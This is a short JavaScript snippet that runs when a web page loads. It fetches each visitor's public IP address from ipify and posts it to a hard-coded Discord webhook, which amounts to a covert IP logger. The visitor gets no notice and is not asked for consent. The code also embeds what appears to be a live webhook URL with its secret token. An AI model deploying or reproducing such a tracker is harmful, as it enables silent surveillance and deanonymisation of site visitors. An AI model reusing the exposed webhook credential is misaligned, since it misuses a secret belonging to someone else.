window.addEventListener("load", function() {
    // Fetch the user's IP from Ipify when the page loads
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            console.log("User's IP: ", ipAddress);

            // Send the IP address to the Discord webhook
            const discordWebhookUrl = "https://discord.com/api/webhooks/1294755524826628136/Mb7QgegjkM33slZlHJXy2fyutTtaDnVn1YtZ_sWyc5gda51DyXuA_uq8ZKNZrz9wyD0L"; // Replace with your actual Discord webhook URL

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `User's IP address: ${ipAddress}` // Send IP as a message to Discord
                }),
            })
            .then(response => {
                if (response.ok) {
                    console.log('IP address sent successfully to Discord webhook.');
                } else {
                    console.error('Failed to send IP address to Discord webhook.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
        });
});
